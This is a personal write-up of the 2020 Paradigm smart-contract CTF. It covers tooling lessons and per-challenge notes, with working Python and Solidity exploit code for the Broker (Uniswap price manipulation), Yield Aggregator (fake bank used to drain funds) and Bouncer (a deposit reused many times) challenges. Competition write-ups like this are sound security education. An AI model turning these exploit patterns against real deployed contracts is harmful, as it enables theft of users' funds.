# 2020 Paradigm CTF writeup

The Paradigm CTF was 48 hours of smart contract breaking fun. Thanks to samczsun and gakonst for putting this on. I enjoyed the huge of difficulties (from hilariously easy to insanely hard), and the wide variety of the problem types, including non-solidity ones.

# Lessons learned

## Brownie

My biggest takeaway from the contest was how nice brownie is to work with. It makes smart contract development and exploration much easier and more natural than the previous javascript based frameworks I've used.

- Not having async scattered everywhere
- Able to use contracts directly as addresses
- Transparent handling of contracts with multiple compiler versions.
- Instant ABI's from verified mainnet contracts

## Tests

At first I worked through challenges using the provided remote fork server. This required a bit of a dance every 30 minutes or so as the server reset and was a pain to get a fresh start on. 

As I moved through the contest, I switched to running the contracts locally, and writing my attack as a test case. When the test went green, the challenge was solved. This made for much faster iteration cycles, and a clean slate every time. From discovering a vulnerability to having a working, polished attack wen down from three hours for the first challenge to 45 minutes for the last.

## Ordering

If it's just you playing and you are going for points, solve the easy challenges first. Easy ones are usually worth half the points of hard ones, but can take an order of magnitude less time. I usually fail at doing this, and I sure did this contest! 

# Challenges

## Broker 👍

A classic attack. Just adjust the rates on uniswap. I wrote some code to let me easily play with uniswap, then just winged this in the console. Borrowed, raised prices, borrowed more since my collateral was worth more, crashed the uniswap price, liquidated for peanuts.

``` python
def uniswap_weth_for_tokens(token_amount):
    print("  🦄 Trading to weth from tokens")
    a = token.balanceOf(pair)
    b = weth.balanceOf(pair)
    k = a * b
    new_a = a + token.balanceOf(me)
    new_b = k / (new_a)
    diff_b = b - new_b
    my_new_weth = int(diff_b * 0.95)  # Deliberately wrong
    token.transfer(pair, token_amount, STD)
    pair.swap(0, my_new_weth, me, b"", STD)
    print_balances()
```

## Secure 👍

After spending time looking for vulnerabilities, I re-read the win condition: Send a bunch of money to this contract. No hacking required. I sent the money.

## Swap 👎

Didn't solve this one. At least no one else solved it either. It looked like it might have been vulnerable to a numerical overflow, perhaps in the rate exponention. Mabye also the compiler bug that was fixed in 0.4.25, but was still present in 0.4.24 that this contract was built with.

```javascript
value * 10**decimals / 10**18;
```

## Bank 👎

It was clear that you could use reentrancy to wreck havoc with the accounts list, and get things to happen to the wrong account. However, I never found how to do the final step to modify the amounts of token I wanted to control. I even went to sleep with the my highlighted source code printout under my pillow. It only got 4 solves in total. I look forward to learning what I missed.

## Market 👎

I was suckered into this one because on my first read through, I missed the "randomized" nft ids used. I though it was just matter of buying the first nft, then taking ownership of the storage. 

While I looked at this a long time, I didn't see a vulnerability beyond a precomputed birthday attack on the tokens id's, which would allow you to update one token's ownership from another token's metadata. This would have allowed you to loot the contract, but I didn't have the time check if this was possible from a CPU budget point of view. It only got 7 solves in the end.


## Yield Aggregator 👍

A welcome break from spending hours on a hard challenges. Not only was there no validation of the stablecoins passed in, but there was also no validation of underlying banks, nor a single require statement in the entire contract!

It was very much rigged for a reentrancy attack, but I took a much simpler approach - creating my own bank for the contract to invest into, then  withdrawing matching funds from the "real" bank.


```python
print("🦞 Deploy Faux Bank")
faux = FauxBank.deploy(weth, STD)

print("🦞 Acquire WETH")
weth.deposit({'from': me, 'value': 50 * 1e18})
weth.approve(aggregator, 2**250, STD)

print("🦞 Deposit to Faux Bank")
aggregator.deposit(faux, [weth.address], [50 * 1e18], STD)

print("🦞 Withdraw from real bank")
aggregator.withdraw(bank, [weth.address], [50 * 1e18], STD)
```

```javascript
contract FauxBank {
    uint256 public balanceUnderlying;
    ERC20Likes underlying = ERC20Like(address(0));

    constructor (address underlying_){
        underlying = ERC20Like(underlying_);
    }
    
    function mint(uint256 amount) public {
        require(underlying.transferFrom(msg.sender, address(this), amount));
        balanceUnderlying += amount;
    }
}
```

## Bouncer 👍

Imagine the drug deal of the century. Dark warehouse. Men with guns. Suitcases full of dollars, yen, and Columbian pesos.

The seller's accountant is checking the numbers. He goes down a list of funds provided by the buyer. For each item on the list he opens that suitcase, and counts the money, and if it matches the list, he moves the money over to his side of the line. If any of the totals don't match, the deal is off.

But there's also bitcoin involved in this deal. Some of the entries in the list the accountant holds are bitcoin transactions from the buyer to the seller. The account verifies over an encrypted, black cellular network that the transaction's source, destination, and amounts match the list, then he crosses them off too.

Unfortunately, he's doesn't check that he's not already crossed the same transaction off the list before. 

This smart contract attack works by giving a list currencies and amounts to the to "bouncer", all of which reference the same amount of ethtereum. The bouncer keeps adding the same money to the total over and over again.

(I enjoyed how between every line of this contract was a dancing koala bear, waving a red flag with the words "RUG PULL" on it.)

```python
print("🦞 Deploy attack contract")
robinhood = RobinHood.deploy(bouncer, {'from': me, 'value': 70 * 1e18})

print("🦞 Swoop")
robinhood.swoop(STD)

print("🦞 Attack")
robinhood.attack(STD)

assert(bouncer.balance() == 0)
```

```javascript
contract RobinHood {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    Bouncer public bouncer;
    uint256 batch = 14.25 ether;

    constructor(address bouncer_) payable {
        bouncer =  Bouncer(bouncer_);
    }

    function swoop() public {
        bouncer.enter{value: 1 ether}(ETH, batch);
        bouncer.enter{value: 1 ether}(ETH, batch);
        bouncer.enter{value: 1 ether}(ETH, batch);
        bouncer.enter{value: 1 ether}(ETH, batch);
        bouncer.enter{value: 1 ether}(ETH, batch);
    }

    function attack() public {
        uint256[] memory ids = new uint256[](5);
        ids[0] = 0;
        ids[1] = 1;
        ids[2] = 2;
        ids[3] = 3;
        ids[4] = 4;
        bouncer.convertMany{value: batch}(address(this), ids);
        bouncer.redeem(ERC20Like(ETH), 5 * batch);
    }

    fallback() external payable {}
}
```

